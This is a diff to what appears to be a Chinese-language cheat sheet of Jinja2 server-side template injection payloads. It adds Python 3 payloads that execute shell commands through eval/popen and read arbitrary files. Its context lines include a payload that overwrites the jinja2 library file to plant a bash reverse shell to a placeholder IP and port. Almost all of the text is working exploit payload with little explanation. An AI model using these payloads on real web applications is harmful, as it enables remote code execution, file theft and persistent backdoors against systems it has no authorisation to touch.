@@ -34,6 +34,12 @@ python2
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/1').write("") }}
 #假设在/usr/lib/python2.7/dist-packages/jinja2/environment.py, 弹一个shell
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/usr/lib/python2.7/dist-packages/jinja2/environment.py').write("\nos.system('bash -i >& /dev/tcp/[IP_ADDR]/[PORT] 0>&1')") }}
+
+python3
+#命令执行：
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
+#文件操作
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
 ```
 常见的payload的思路都常常是利用python内置的变量属性等出发·通过调用一些隐藏的属性（方法）从而实现代码输入
 
